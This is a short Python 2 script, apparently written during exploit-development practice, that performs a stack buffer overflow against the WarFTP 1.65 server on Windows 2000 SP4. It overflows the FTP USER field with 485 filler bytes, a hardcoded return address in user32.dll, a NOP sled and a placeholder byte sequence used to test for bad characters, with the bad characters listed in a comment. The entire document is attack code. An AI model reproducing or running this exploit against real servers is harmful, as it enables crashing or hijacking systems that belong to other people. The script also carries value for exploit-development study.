#! /usr/bin/python 
# Name: Rio Atmadja
# Program: Exploit Development warftp 1.65

import sys
import socket 

def fuzzing(hostname):

	#Target: Windows 2000 sp4 
	#dll   : user32.dll 
	#ret   : 0x77e14c29
	ret = "\x29\x4c\xe1\x77"
	
	#bad char: '\x00\x0d\x0a\x40\xcc\xff'
	shellcode = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e"
	shellcode += "\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d"

	password = "user"
	username = '\x41' * 485 + ret + '\x90' * 16 + shellcode 
	connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		#connect to the host 
		connect.connect((hostname, 21))

	except:

		print "[-] Connection Error"
		response = connect.recv(2000)
		print response
		sys.exit(1)

	#send username to the server 
	connect.send("user %s\r\n" %username)
	response = connect.recv(2000)
	print response 

	#send password to the server 
	connect.send("pass %s\r\n" %password)
	response = connect.recv(2000)
	print response 

	connect.close()

if __name__ == '__main__':
	try:
		target = sys.argv[1]
	except IndexError:
		print 'Usage: %s <target>' % sys.argv[0]
		sys.exit(-1)
	
	fuzzing(target)
